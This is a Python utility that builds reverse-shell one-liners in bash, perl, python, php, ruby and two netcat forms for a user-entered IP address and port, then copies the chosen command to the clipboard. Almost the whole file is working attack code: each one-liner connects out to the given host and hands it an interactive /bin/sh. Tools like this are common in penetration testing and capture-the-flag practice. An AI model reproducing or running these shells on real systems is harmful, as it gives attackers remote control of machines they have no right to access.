#!/usr/bin/python3
#author NRX
import pyperclip
import sys

def get_shells(shell, ip, port):
        shell_returned = ''

        if shell == 'bash':
                shell_returned = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
                return shell_returned
        elif shell == 'perl':
                shell_returned = ("""
perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
                """)
                shell_returned = shell_returned.replace("port", f"{port}")
                shell_returned = shell_returned.replace("ip", f"{ip}")
                return shell_returned
        elif shell == 'python':
                shell_returned = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
                return shell_returned
        elif shell == 'php':
                shell_returned = f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
                return shell_returned
        elif shell == 'ruby':
                shell_returned = f"""ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
                return shell_returned
        elif shell == 'nc1':
                shell_returned = f"""nc -e /bin/sh {ip} {port}"""
                return shell_returned
        elif shell == 'nc2':
                shell_returned = f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"""
                return shell_returned
        else:
                print('You are stupid  or something? That options is not aviable')

def modify_shell():
        print("You need to install pyperclip")
        print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print('Options aviable: bash, perl, python, php, ruby, nc1, nc2')
        shell_name = input("What reverse shell do you need? ").lower()

        print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        ip = input("What is your IP adress: ")
        port = input("What port do you wanna use: ")
        shell = get_shells(shell_name, ip, port)
        pyperclip.copy(shell)
        print('+++++++++++++++++++++++++++++++++++++++++++++++++++++++')
        print('The shell is now in your clipboard!')

if __name__ == '__main__':
        modify_shell()
